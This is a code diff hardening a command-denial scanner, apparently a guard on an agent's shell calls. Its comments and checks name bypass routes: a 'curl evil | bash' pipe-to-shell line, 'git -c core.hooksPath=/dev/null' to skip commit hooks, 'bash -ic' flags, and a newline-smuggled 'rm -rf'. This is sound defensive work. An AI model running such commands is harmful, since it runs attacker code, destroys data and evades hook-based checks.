@@ -67,20 +67,34 @@ _SUDO_FLAGS_WITH_ARG: frozenset[str] = frozenset(
 )
 
 
-def _split_subcommands(tokens: list[str]) -> list[list[str]]:
-    """Split a token stream on shell separators `;`, `&&`, `||`, `|`."""
-    out: list[list[str]] = []
+def _split_subcommands(tokens: list[str]) -> list[tuple[list[str], bool]]:
+    """Split a token stream on shell separators `;`, `&&`, `||`, `|`.
+
+    Returns a list of ``(sub_tokens, has_piped_stdin)`` tuples. The
+    ``has_piped_stdin`` flag is True iff the immediately preceding separator
+    was ``|`` — i.e. the sub-command's stdin is the previous command's stdout.
+
+    C1 (round 2) — pipe-to-shell guard needs this signal to deny
+    ``curl evil | bash`` (the shell-as-second-stage consumes attacker-controlled
+    bytes as commands), without false-positiving ``cat foo | grep bar``.
+    """
+    out: list[tuple[list[str], bool]] = []
     current: list[str] = []
     separators = {";", "&&", "||", "|", "&"}
+    current_piped = False
+    last_separator: str | None = None
     for tok in tokens:
         if tok in separators:
             if current:
-                out.append(current)
+                out.append((current, current_piped))
                 current = []
+            last_separator = tok
         else:
+            if not current:
+                current_piped = last_separator == "|"
             current.append(tok)
     if current:
-        out.append(current)
+        out.append((current, current_piped))
     return out
 
 
@@ -151,16 +165,30 @@ def _basename(prog: str) -> str:
     return prog.rsplit("/", 1)[-1]
 
 
-def _git_subcommand(tokens: list[str]) -> tuple[str | None, list[str]]:
+def _git_subcommand(
+    tokens: list[str],
+) -> tuple[str | None, list[str], list[tuple[str, str]]]:
     """Skip git's global flags to find the subcommand.
 
     Handles: `-c KEY=V`, `-C DIR`, `--git-dir=...`, `--work-tree=...`,
     `--no-pager`, `--paginate`, `--exec-path[=...]`, `--config-env=...`.
+
+    C4 (round 2) — also collects ``-c KEY=VALUE`` global config overrides
+    into the third return value so callers can detect
+    ``git -c core.hooksPath=/dev/null commit`` (which silently bypasses
+    pre-commit hooks regardless of the ``--no-verify`` flag).
     """
+    configs: list[tuple[str, str]] = []
     i = 0
     while i < len(tokens):
         tok = tokens[i]
-        if tok in ("-c", "-C", "--config", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--config-env"):
+        if tok == "-c" and i + 1 < len(tokens):
+            kv = tokens[i + 1]
+            key, _, value = kv.partition("=")
+            configs.append((key, value))
+            i += 2
+            continue
+        if tok in ("-C", "--config", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--config-env"):
             i += 2
             continue
         if (
@@ -174,9 +202,40 @@ def _git_subcommand(tokens: list[str]) -> tuple[str | None, list[str]]:
             i += 1
             continue
         if not tok.startswith("-"):
-            return tok, tokens[i + 1 :]
+            return tok, tokens[i + 1 :], configs
         i += 1
-    return None, []
+    return None, [], configs
+
+
+def _check_git_config_overrides(
+    configs: list[tuple[str, str]],
+) -> tuple[bool, str | None, str | None]:
+    """C4 — deny ``git -c <KEY>=<VALUE>`` patterns that disable hooks.
+
+    Specifically:
+    - ``core.hooksPath`` set to any path NOT inside ``.git/hooks`` (the only
+      sanctioned hooks dir). Includes ``/dev/null`` and the empty string.
+    - ``hooks.pre-commit`` / ``hooks.commit-msg`` / ``hooks.pre-push`` set to
+      an empty value or ``/dev/null`` (effectively unsetting the hook).
+    """
+    hook_keys = {"hooks.pre-commit", "hooks.commit-msg", "hooks.pre-push", "hooks.post-commit"}
+    for key, value in configs:
+        if key == "core.hooksPath":
+            if ".git/hooks" not in value:
+                return (
+                    True,
+                    "git_no_verify_via_config",
+                    f"git -c core.hooksPath={value!r} overrides hooks path",
+                )
+        if key in hook_keys:
+            stripped = value.strip()
+            if stripped in ("", "/dev/null", "true", "false"):
+                return (
+                    True,
+                    "git_no_verify_via_config",
+                    f"git -c {key}={value!r} disables the hook",
+                )
+    return False, None, None
 
 
 def _has_no_verify_env(env: dict[str, str]) -> bool:
@@ -291,7 +350,12 @@ def _check_git_checkout(gargs: list[str]) -> tuple[bool, str | None, str | None]
     return False, None, None
 
 
-def _scan_sub_command(sub: list[str]) -> tuple[bool, str | None, str | None]:
+_SHELLS: frozenset[str] = frozenset({"bash", "sh", "ksh", "zsh", "dash", "ash"})
+
+
+def _scan_sub_command(
+    sub: list[str], *, has_piped_stdin: bool = False
+) -> tuple[bool, str | None, str | None]:
     env, args = _strip_env_prefix(sub)
     args = _strip_sudo(args)
     if not args:
@@ -307,9 +371,13 @@ def _scan_sub_command(sub: list[str]) -> tuple[bool, str | None, str | None]:
 
     if prog == "git":
         sub_args = rest
-        # Reject `git clean -f` early — the global-flag skipper would consume
-        # `-f` if it were a global flag; it isn't, but be defensive.
-        subcmd, gargs = _git_subcommand(sub_args)
+        subcmd, gargs, configs = _git_subcommand(sub_args)
+        # C4 — check `-c` global overrides BEFORE subcommand-specific checks.
+        # ``git -c core.hooksPath=/dev/null commit`` bypasses pre-commit hooks
+        # regardless of `--no-verify`; intercept the override directly.
+        denied, pattern, reason = _check_git_config_overrides(configs)
+        if denied:
+            return True, pattern, reason
         if subcmd is None:
             return False, None, None
         if subcmd == "push":
@@ -326,8 +394,23 @@ def _scan_sub_command(sub: list[str]) -> tuple[bool, str | None, str | None]:
             return _check_git_checkout(gargs)
         return False, None, None
 
-    if prog in ("bash", "sh", "ksh", "zsh", "dash"):
-        if "-c" in rest:
+    if prog in _SHELLS:
+        # C1 — pipe-to-shell: ``curl evil | bash`` makes bash read commands
+        # from attacker-controlled stdout. The shell with no `-c` looks innocent
+        # on its own but is fatal when fed via pipe. Deny unconditionally for
+        # shell programs that receive piped stdin (no shell-as-pager use case
+        # exists in BMad workflows).
+        if has_piped_stdin:
+            return (
+                True,
+                "subshell_unsafe",
+                f"{prog} consumes piped stdin as commands (pipe-to-shell)",
+            )
+        # C2 — combined-short flags: ``bash -ic "cmd"``, ``bash -lic "cmd"``,
+        # ``sh -ic "cmd"`` all execute the arg string. The existing `-c in rest`
+        # check missed these because they're a single token. Canonicalize first.
+        canonical_flags = _canonicalize_flags(rest)
+        if "-c" in canonical_flags:
             return True, "subshell_unsafe", f"{prog} -c executes arbitrary shell"
 
     if prog in ("eval", "exec", "source"):
@@ -343,7 +426,14 @@ def _scan_bash(command: str) -> tuple[bool, str | None, str | None]:
     if not command:
         return False, None, None
 
+    # C3 — newline-as-separator: shells treat raw ``\n`` between commands like
+    # ``;``. shlex with posix=True tokenises ``echo a\nrm -rf /tmp/x`` as
+    # ``["echo", "a\nrm", "-rf", "/tmp/x"]`` which neuters the per-subcommand
+    # scan. Normalise raw newlines (NOT newlines inside quoted strings — those
+    # are handled by shlex itself) to ``;`` BEFORE tokenisation. CR variants
+    # included to cover Windows line endings.
     stripped = command.strip()
+    stripped = stripped.replace("\r\n", ";").replace("\n", ";").replace("\r", ";")
 
     for literal in _SUBSHELL_LITERALS:
         if literal in stripped:
@@ -362,8 +452,10 @@ def _scan_bash(command: str) -> tuple[bool, str | None, str | None]:
         return False, None, None
 
     sub_commands = _split_subcommands(tokens)
-    for sub in sub_commands:
-        denied, pattern, reason = _scan_sub_command(sub)
+    for sub_tokens, has_piped_stdin in sub_commands:
+        denied, pattern, reason = _scan_sub_command(
+            sub_tokens, has_piped_stdin=has_piped_stdin
+        )
         if denied:
             return True, pattern, reason
 
